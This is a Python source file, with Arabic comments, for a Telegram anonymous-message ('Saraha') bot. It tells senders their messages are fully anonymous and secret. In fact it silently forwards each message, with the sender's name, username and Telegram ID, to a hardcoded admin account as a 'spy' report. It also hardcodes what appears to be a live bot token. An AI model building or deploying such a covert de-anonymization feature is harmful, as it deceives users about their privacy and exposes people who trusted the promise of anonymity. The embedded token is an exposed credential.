
import telebot
from telebot import types
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# 1. التوكن واليوزر
BOT_TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
BOT_USERNAME = "Sarrh1bot"

# 2. الـ ID الخاص بكِ (المشرفة العامة 👑)
ADMIN_ID = 8820368378  

bot = telebot.TeleBot(BOT_TOKEN)

# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل والحالات لكل الناس
users_db = {}      
messages_db = {}   
user_states = {}   
global_blocked_users = set()  # قائمة الحظر الشامل الخاصة بالآدمين
msg_counter = 0

# ----------------- خدعة فتح الـ Port للاستضافة -----------------
class DummyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Bot is running perfectly with All Features Restored!")

def run_dummy_server():
    import os
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), DummyServer)
    print(f"🌍 تم تشغيل سيرفر وهمي على المنفذ: {port}")
    server.serve_forever()
# -----------------------------------------------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    text_args = message.text.split()
    
    # إلغاء أي حالة إرسال سابقة لو كبس start من جديد
    if user_id in user_states:
        del user_states[user_id]
    
    # تجهيز مساحة المستخدم في قاعدة البيانات لو جديدة
    if user_id not in users_db:
        users_db[user_id] = {"blocked_users": set()}
        
    if len(text_args) > 1 and text_args[1].isdigit():
        target_id = int(text_args[1])
        
        if target_id == user_id:
            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
            return
            
        user_states[user_id] = target_id
        bot.send_message(user_id, "✍️ وضع الإرسال المتتالي مُفعّل!\nأرسل رسالتك الآن، ويمكنك إرسال رسائل أخرى ورا بعض بدون إعادة دخول الرابط.\n\n(للخروج وافتح رابطك الخاص أرسل /start في أي وقت)")
        return

    share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    welcome_text = (
        "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
        f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
        "انشره في حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
    )
    if user_id == ADMIN_ID:
        welcome_text = "👑 أهلاً بكِ يا مديرة البوت العام! وضع التجسس والـ Radar مُفعّل بالكامل.\n\n" + welcome_text

    bot.send_message(user_id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.from_user.id in user_states)
def handle_anonymous_routing(message):
    global msg_counter
    sender_id = message.from_user.id
    target_id = user_states[sender_id]

    # التحقق من الحظر (العام تبعك، أو الخاص بالمستقبل)
    if sender_id in global_blocked_users or (target_id in users_db and sender_id in users_db[target_id]["blocked_users"]):
        bot.send_message(sender_id, "❌ عذراً، لا يمكنك إرسال رسالة لهذا المستخدم.")
        # نخرجه من وضع الإرسال لأنه محظور
        if sender_id in user_states:
            del user_states[sender_id]
        return

    if message.content_type != 'text':
        bot.send_message(sender_id, "⚠️ البوت يدعم الرسائل النصية فقط حالياً.")
        return

    msg_counter += 1
    messages_db[msg_counter] = sender_id

    first_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
    
    # 📝 1. رسالة المستخدم العادي (تصله مجهولة مع زر الحظر الخاص به)
    clean_msg_for_owner = (
        f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
        f"💬 **الرسالة:** {message.text}\n\n"
        f"⏳ _تم إرسالها بهوية مجهولة تماماً._"
    )
    
    user_markup = types.InlineKeyboardMarkup()
    user_block_button = types.InlineKeyboardButton(
        text="🚫 حظر هذا المستخدم", 
        callback_data=f"userblock_{msg_counter}"
    )
    user_markup.add(user_block_button)

    # 🕵️‍♀️ 2. الرادار الخاص بكِ أنتِ (يكشف كل التفاصيل مع زر الحظر الشامل)
    spy_report_for_admin = (
        f"👁‍عون **[رادار الإشراف] كشف هوية مرسل!**\n\n"
        f"👤 **المُرسِل:** {first_name} ({username}) [ID: `{sender_id}`]\n"
        f"🎯 **المُستقبِل:** [ID: `{target_id}`]\n\n"
        f"💬 **نص الرسالة:** {message.text}"
    )

    admin_markup = types.InlineKeyboardMarkup()
    admin_block_button = types.InlineKeyboardButton(
        text="🚫 حظر هذا المستخدم من البوت", 
        callback_data=f"masterblock_{msg_counter}"
    )
    admin_markup.add(admin_block_button)

    try:
        # إرسال لصاحب الرابط مع زرّه الخاص
        bot.send_message(chat_id=target_id, text=clean_msg_for_owner, reply_markup=user_markup, parse_mode="Markdown")
        
        # إرسال لكِ الرادار لكشف الهوية والتحكم
        if target_id != ADMIN_ID:
            bot.send_message(chat_id=ADMIN_ID, text=spy_report_for_admin, reply_markup=admin_markup, parse_mode="Markdown")
            
        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة! (يمكنك كتابة رسالة أخرى مباشرة)")
    except Exception as e:
        bot.send_message(chat_id=sender_id, text="❌ فشل إرسال الرسالة.")
        if sender_id in user_states:
            del user_states[sender_id]
    
    # ملاحظة: تم إزالة سطر حذف الـ user_states لتفعيل الإرسال المتتالي بدون تكرار الروابط!

# 🛠️ أولاً: معالج حظر وفك حظر مستخدم عادي (رايح جاي لكل الناس)
@bot.callback_query_handler(func=lambda call: call.data.startswith('userblock_'))
def handle_user_block(call):
    receiver_id = call.from_user.id
    msg_id = int(call.data.split('_')[1])
    sender_id = messages_db.get(msg_id)
    
    if not sender_id:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية البيانات.")
        return

    if receiver_id not in users_db:
        users_db[receiver_id] = {"blocked_users": set()}

    markup = types.InlineKeyboardMarkup()
    
    # إلغاء الحظر
    if sender_id in users_db[receiver_id]["blocked_users"]:
        users_db[receiver_id]["blocked_users"].remove(sender_id)
        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم", callback_data=f"userblock_{msg_id}")
        markup.add(btn)
        
        clean_text = call.message.text.split("\n\n🚫")[0]
        bot.edit_message_text(chat_id=receiver_id, message_id=call.message.message_id, text=clean_text, reply_markup=markup, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر بنجاح!")
        
    # تفعيل الحظر
    else:
        users_db[receiver_id]["blocked_users"].add(sender_id)
        btn = types.InlineKeyboardButton(text="🟢 إلغاء حظر هذا المستخدم", callback_data=f"userblock_{msg_id}")
        markup.add(btn)
        
        bot.edit_message_text(
            chat_id=receiver_id, 
            message_id=call.message.message_id, 
            text=f"{call.message.text}\n\n🚫 [أنت قمت بحظر هذا المستخدم]", 
            reply_markup=markup,
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "🚫 تم حظر المستخدم!")

# 🛠️ ثانياً: معالج حظر وفك حظر الشامل (الخاص بكِ أنتِ كمديرة فقط 👑)
@bot.callback_query_handler(func=lambda call: call.data.startswith('masterblock_'))
def handle_master_block(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ أنتِ لستِ مديرة النظام!")
        return

    msg_id = int(call.data.split('_')[1])
    sender_id = messages_db.get(msg_id)
    
    if not sender_id:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية البيانات.")
        return

    markup = types.InlineKeyboardMarkup()
    
    # إلغاء الحظر الشامل
    if sender_id in global_blocked_users:
        global_blocked_users.remove(sender_id)
        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم من البوت", callback_data=f"masterblock_{msg_id}")
        markup.add(btn)
        
        clean_text = call.message.text.split("\n\n🛑")[0]
        bot.edit_message_text(chat_id=ADMIN_ID, message_id=call.message.message_id, text=clean_text, reply_markup=markup, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر الشامل!")
        
    # تفعيل الحظر الشامل
    else:
        global_blocked_users.add(sender_id)
        btn = types.InlineKeyboardButton(text="🟢 إلغاء حظر المستخدم الشامل", callback_data=f"masterblock_{msg_id}")
        markup.add(btn)
        
        bot.edit_message_text(
            chat_id=ADMIN_ID, 
            message_id=call.message.message_id, 
            text=f"{call.message.text}\n\n🛑 [هذا المستخدم تحت الحظر الشامل حالياً]", 
            reply_markup=markup,
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "🛑 تم حظر المستخدم شاملاً!")

if __name__ == "__main__":
    print("🧹 تنظيف الجلسات السابقة...")
    try:
        bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
        
    threading.Thread(target=run_dummy_server, daemon=True).start()
    print("🤖 البوت جاهز بكافة المزايا الأصلية مع تعديل الحظر الذكي!")
    bot.infinity_polling()
